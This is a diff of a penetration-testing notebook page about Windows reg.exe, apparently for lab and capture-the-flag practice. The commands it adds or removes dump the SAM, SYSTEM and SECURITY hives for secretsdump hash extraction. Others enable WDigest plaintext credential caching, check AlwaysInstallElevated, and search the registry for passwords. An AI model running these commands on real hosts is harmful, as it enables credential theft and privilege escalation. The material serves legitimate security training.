@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/reg.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Inspect local Winlogon configuration
+[Search this tool’s saved examples](/commands/notebook?tool=reg) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Inspect local Winlogon configuration
 
 **Run in:** Windows cmd.exe. **Requires:** Read access to the selected registry key and awareness of the host/registry view being queried.
 
@@ -21,76 +29,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 ```
 
-**Read the result:** Identify the hive/key and distinguish query, export, save and modification operations.
-
-**If Values are absent or refer to an old account:** Reading configuration differs from saving protected hives; elevation and registry view can change what is accessible.
+**What the result establishes:** Identify the hive/key and distinguish query, export, save and modification operations.
 
 **Next check:** Record the key and actual values; verify account scope and current validity before attempting authentication.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## reg.exe: choose the operation and read the result
-
-Query the registry or export the SAM/SYSTEM hives for offline parsing.
-
-### What the result establishes
-
-Identify the hive/key and distinguish query, export, save and modification operations.
-
-### Prerequisites and common failures
-
-Reading configuration differs from saving protected hives; elevation and registry view can change what is accessible.
-
-### Example 1: Autologon configuration
-
-Run in: **Windows cmd.exe or PowerShell**.
-
-```text
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
-```
-
-### Example 2: Export local account hives
-
-Run in: **Elevated Windows cmd.exe or PowerShell**. C:\Temp must exist; save both hives from the same host.
-
-```text
-reg save HKLM\SAM C:\Temp\SAM
-reg save HKLM\SYSTEM C:\Temp\SYSTEM
-```
-
-### Example 3: Read transferred hives
-
-Run in: **Kali**. Transfer both files to Kali first.
-
-```bash
-impacket-secretsdump -sam SAM -system SYSTEM LOCAL
-```
-
-## Saved commands and notebook recipes
-
-Query the registry or export the SAM/SYSTEM hives for offline parsing.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=reg) · [All tools](/index)
-
-## Autologon configuration
-
-**Windows cmd.exe or PowerShell**
-
-```text
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
-```
 
 ## Export local account hives
 
@@ -113,11 +54,15 @@ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 
 Transfer both files to Kali first.
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| Values are absent or refer to an old account | Reading configuration differs from saving protected hives; elevation and registry view can change what is accessible. |
 
 ## Notebook recipes
 
-15 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+16 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
@@ -201,6 +146,54 @@ reg.exe save hklm\security C:\security.save
 
 </Accordion>
 
+<Accordion title="2. Enable caching for the lab">
+
+### 2. Enable caching for the lab
+
+**WDigest — plaintext missing**
+
+```text
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1
+```
+
+</Accordion>
+
+<Accordion title="4a. Restore an original DWORD value">
+
+### 4a. Restore an original DWORD value
+
+**WDigest — plaintext missing**
+
+```text
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d ORIGINAL_VALUE /f
+```
+
+</Accordion>
+
+<Accordion title="4b. Restore an originally absent value">
+
+### 4b. Restore an originally absent value
+
+**WDigest — plaintext missing**
+
+```text
+reg delete "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /f
+```
+
+</Accordion>
+
+<Accordion title="Read the WDigest credential-caching setting">
+
+### Read the WDigest credential-caching setting
+
+**WDigest — plaintext missing**
+
+```console
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential
+```
+
+</Accordion>
+
 <Accordion title="C. SeBackup / SeRestore → read any file">
 
 ### C. SeBackup / SeRestore → read any file
@@ -217,7 +210,7 @@ reg save HKLM\SYSTEM C:\Temp\SYSTEM
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Windows Post-Exploitation: Field Reference — C. SeBackup / SeRestore → read any file](/cheatsheets/windows-post-exploitation#c-sebackup-/-serestore-→-read-any-file) · [Impacket: Script Quick Reference — Example 5: C. SeBackup / SeRestore → read any file](/tools/impacket#example-5-c-sebackup-/-serestore-→-read-any-file)
+**Original note sections:** [Windows Post-Exploitation: Field Reference — C. SeBackup / SeRestore → read any file](/cheatsheets/windows-post-exploitation#c-sebackup-/-serestore-→-read-any-file)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -284,21 +277,6 @@ schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"
 ```powershell
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Windows Privilege Escalation: Full Checklist — AlwaysInstallElevated](/privesc/windows-privesc-checklist#alwaysinstallelevated)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Windows Privilege Escalation: Full Checklist**
-
-Context from the notebook: Using the  reg query  command, you can check the status of the  AlwaysInstallElevated  registry key for both the user and the machine. If both queries return a value of  0x1 , then  AlwaysInstallElevated  is enabled for both user and machine, indicating the system is vulnerable.
-
-```text
-reg query
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
@@ -397,54 +375,13 @@ reg query HKCU /f password /t REG_SZ /s
 
 </Accordion>
 
-<Accordion title="The core idea: secrets, not passwords">
-
-### The core idea: secrets, not passwords
-
-**Windows Authentication: NTLM and Kerberos**
-
-Context from the notebook: SAM  ( HKLM\SAM ) NT hashes of  local  accounts reg save , Mimikatz  lsadump::sam , secretsdump (local)
-
-```text
-reg save
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Windows Authentication: NTLM and Kerberos — The core idea: secrets, not passwords](/password-attacks/windows-authentication-ntlm-kerberos#the-core-idea-secrets-not-passwords)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="🧾 QUICK REFERENCE — &quot;I see X → do Y&quot;">
-
-### 🧾 QUICK REFERENCE — "I see X → do Y"
-
-**Windows Post-Exploitation: Field Reference**
-
-Context from the notebook: SeBackupPrivilege reg save SAM/SYSTEM  → secretsdump LOCAL
-
-```text
-reg save SAM/SYSTEM
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Windows Post-Exploitation: Field Reference — 🧾 QUICK REFERENCE — "I see X → do Y"](/cheatsheets/windows-post-exploitation#-quick-reference-—-i-see-x-→-do-y)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
 </AccordionGroup>
 
 ## Related tools and references
 
 - [WDigest — plaintext missing](/commands/wdigest)
 - [secretsdump.py](/commands/secretsdump)
+- [Official documentation 1](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg)
 
 {/* VAULT_RELATED_START */}
 
@@ -455,5 +392,3 @@ reg save SAM/SYSTEM
 - [secretsdump.py](/commands/secretsdump)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
